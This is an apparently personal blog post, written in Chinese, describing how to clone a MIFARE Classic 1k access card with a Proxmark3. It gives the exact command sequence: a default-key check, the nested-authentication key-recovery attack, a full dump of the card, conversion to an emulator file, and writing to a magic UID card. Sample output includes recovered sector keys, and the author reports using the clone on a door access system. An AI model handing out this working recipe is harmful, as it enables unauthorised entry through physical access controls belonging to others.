---
layoyt: post
title: Clone IC Card with Proxmark3
---

好吧，今天高产似母猪。。。

安装好了 Proxmark3 的驱动，自然要玩一玩 IC 卡克隆喽。

IC Card: NXP MIFARE CLASSIC 1k | Plus 2k SL1

1. 读取 IC 卡型号，确定与本实验相同
```
hf 14a read
```
2. 使用厂家常用默认密码碰碰运气，国内好多是 `ffffffffffff`, 我会乱说
```
hf mf chk *1 ? t
```
参数不确定的话，使用 `hf mf chk` 查看，运气好的话
```
Found valid key:[ffffffffffff]
```
3. 利用嵌套认证漏洞，使用任何一个扇区的已知密钥，获取所有扇区的密钥（其实不懂这句话讲什么啦）
```
hf mf nested 1 0 a FFFFFFFFFFFF d
```
结果大致如下
```
Iterations count: 63
|---|----------------|---|----------------|---|          
|sec|key A           |res|key B           |res|          
|---|----------------|---|----------------|---|          
|000|  484558414354  | 1 |  a22ae129c013  | 1 |          
|001|  484558414354  | 1 |  49fae4e3849f  | 1 |          
|002|  484558414354  | 1 |  38fcf33072e0  | 1 |          
|003|  484558414354  | 1 |  000000000000  | 0 |          
|004|  484558414354  | 1 |  509359f131b1  | 1 |          
|005|  484558414354  | 1 |  6c78928e1317  | 1 |          
|006|  484558414354  | 1 |  aa0720018738  | 1 |          
|007|  484558414354  | 1 |  a6cac2886412  | 1 |          
|008|  484558414354  | 1 |  62d0c424ed8e  | 1 |          
|009|  484558414354  | 1 |  e64a986a5d94  | 1 |          
|010|  484558414354  | 1 |  8fa1d601d0a2  | 1 |          
|011|  484558414354  | 1 |  89347350bd36  | 1 |          
|012|  484558414354  | 1 |  66d2b7dc39ef  | 1 |          
|013|  484558414354  | 1 |  6bc1e1ae547d  | 1 |          
|014|  484558414354  | 1 |  22729a9bd40f  | 1 |          
|015|  484558414354  | 1 |  484558414354  | 1 |          
|---|----------------|---|----------------|---|
Printing keys to binary file dumpkeys.bin...
```
res 为 `1` 的话，表示密码正确，`0` 不正确，“一般 B 密码不正确不影响读取数据，可以忽视”

4. dump 数据到本地 dumpdata.bin 文件
```
hf mf dump
```
该文件在之前运行 proxmark3 的 `proxmark3/client/` 目录下，
被克隆的卡现在可以移除了

5. 把 dumpdata.bin 转换成可以刷人其他 IC 卡的 eml 文件，该文件以卡号命名，即 [八个16进制字符的卡号].eml
```
script run dumptoemul.lua
```
生成的 eml 文件同样在 `proxmark3/client/` 目录下

6. 把准备用来克隆的空白卡放在高频卡读卡位置换上，本实验使用俗称 M1 UID 的卡
```
hf mf cload [被克隆卡的八个16进制字符的卡号]
```
如果出现
```
Loaded from file: [八个16进制字符的卡号].eml
```
说明克隆成功！

得瑟地马上去试了一下门禁，完全没有问题。

## Reference
* [http://bouzdeck.com/rfid/32-cloning-a-mifare-classic-1k-tag.html](http://bouzdeck.com/rfid/32-cloning-a-mifare-classic-1k-tag.html)
* 卖家的克隆 IC 卡图片教程
